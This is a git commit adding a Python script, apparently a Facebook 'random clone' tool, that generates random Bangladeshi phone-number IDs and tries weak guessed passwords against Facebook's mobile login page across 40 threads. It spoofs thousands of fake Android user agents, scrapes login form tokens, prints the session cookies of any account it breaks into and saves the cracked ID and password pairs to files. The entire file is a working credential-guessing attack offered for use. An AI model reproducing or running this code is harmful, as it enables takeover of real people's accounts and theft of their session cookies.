b063d030a6b9fb204996bc5e5172ec64e1f65b26
Fx_Ariyan990 <150211676+Fx990@users.noreply.github.com>
2023-11-15 22:59:11 +0600

    Create rndm.py
    git clone https://github.com/Fx990/rndm.git
    cd rndm
    python rndm.py

---
+++ rndm.py
@@ -0,0 +1,219 @@
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#Sc Make By Asraful Islam Hasan
+#Gift By Jahid & Hasan
+#Github KgHasan
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••••••••••••COLUAR•••••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+P = '\x1b[1;97m' # White
+M = '\033[1;33m' # Yellow
+H = '\033[1;32m' # Green
+K = '\x1b[1;97m' # White
+B = '\x1b[1;96m' # Rad
+U = '\x1b[1;95m' # ______
+O = '\x1b[1;97m' # White
+N = '\x1b[0m'    # Black
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••USER AGENT•••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+def hasanua():
+	ua = ("")
+	return ua
+ugen=[]
+for xd in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
+    d=random.randrange(10,200)
+    e='0.4844.88 '
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
+    prodi=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(prodi)
+for xd in range(9000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(10,200)
+    e='0'
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
+    prodi=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(prodi)
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      sumaiya=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(sumaiya)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	sumaiya=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(sumaiya)
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••••••••MY LOGO••••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+logo =("""
+SC MAKE BY ASRAFUL ISLAM HASAN
+""") 
+def Al_Hasan():
+	print("<•••••••••••••••••••••••••••••••••••>")
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••••SCRIPT MAIN•••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+def Nodi_Hasan():
+    os.system('clear');os.system('xdg-open https://www.facebook.com/copy.link.erorr404');print(logo);print("");Al_Hasan();print("\033[1;36m\033[1;35m[\033[1;32m1\033[1;35m] \033[1;32m BD RANDOM CLONE");print("\033[1;36m\033[1;35m[\033[1;32m2\033[1;35m] \033[1;32m JOIN MY FB GROUP");print("\033[1;36m\033[1;35m[\033[1;32m3\033[1;35m] \033[1;32m FOLLOW MY FB PAGE");print("\033[1;36m\033[1;35m[\033[1;32m0\033[1;35m] \033[1;32m CLOSED TOOLS");Al_Hasan();Tahrima = input(f'\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
+    if Tahrima in ["1","A","a"]:
+        Nodi()
+    if Tahrima in ["2","B","b"]:
+        os.system('xdg-open https://facebook.com/groups/551365756758487/');Nodi()
+    if Tahrima in ["3","C","c"]:
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100090740779812');Nodi()
+    if Tahrima in ["0","E","e"]:
+        exit('THANKS USE MY TOOLS')
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••ASRAFUL ISLAM•••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+def Nodi():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear");print(logo);Al_Hasan();print("\033[1;31m\033[1;36m CHOICE YOUR CODE : 019 , 014 , 013 , 017 , 018 , 016 ");Al_Hasan();code = input('\033[1;32m TYP YOUR CODE :\033[1;36m ');os.system('clear');os.system('xdg-open https://facebook.com/groups/920428789151086/');print(logo);Al_Hasan();print("\033[1;31m\033[1;36m YOUR CLONE LIMIT : 10000 , 20000 , 40000 , 50000 ");Al_Hasan()
+    limit=int(input("\033[1;32m CHOICE LIMIT :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Hasan_Asha:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        Al_Hasan();print(f'\033[1;91m\033[1;92m CHOICE SIM CODE NO : '+code);print(f'\033[1;91m\033[1;92m TOUR TOTAL ACCOUNT: '+tl);Al_Hasan();print('')
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','bangladesh']
+            uid = code+love
+            Hasan_Asha.submit(Asraful,uid,pwx,tl)
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#••••••••••••••••••••••SCRIPT MATHOID••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+def Asraful(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mGIFT\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            hasanasha = random.choice(ugen)
+            free_fb = session.get('https://p.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdNEleRo5HFTLsoyHY15XMYzeaHuDhI5NQoq6skAmjgr91WcJsuy2fh3lkmFtn8qXhIS0HnjR1BKRbimpYVWOZ5hXoBwDFS788juYS3LOcPBQ&smuh=24745&lh=Ac_TBv170kCdzrqSsv4&wtsid=rdr_04YJ22I7tJXUMgJBO&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"itel S661LP"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': hasanasha,
+            'viewport-width': '980',}
+            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f'\033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'\033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+Nodi_Hasan()
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••CLOSED•••••••••••••••••••••••••••••••••#
+#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
